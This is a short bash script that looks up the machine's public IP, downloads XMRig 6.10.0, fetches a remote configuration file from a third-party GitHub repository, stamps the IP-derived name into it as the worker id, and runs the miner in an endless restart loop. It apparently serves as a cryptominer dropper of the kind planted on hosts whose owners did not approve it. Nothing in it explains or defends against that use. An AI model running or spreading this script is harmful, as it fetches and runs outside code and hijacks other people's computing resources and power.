#!bin/bash -xe 
iip=$(curl https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl ipinfo.io
rm -rf xmrig-6.10.0-linux-x64.tar.gz 
rm -rf xmrig-6.10.0
wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-x64.tar.gz 
tar -xzf xmrig-6.10.0-linux-x64.tar.gz 
cd xmrig-6.10.0
wget https://github.com/one10001/10001code/raw/main/config3.json
sed -i "s+ip0001+$IPNAME+g" config3.json
while true; do ./xmrig -c config3.json ; done;
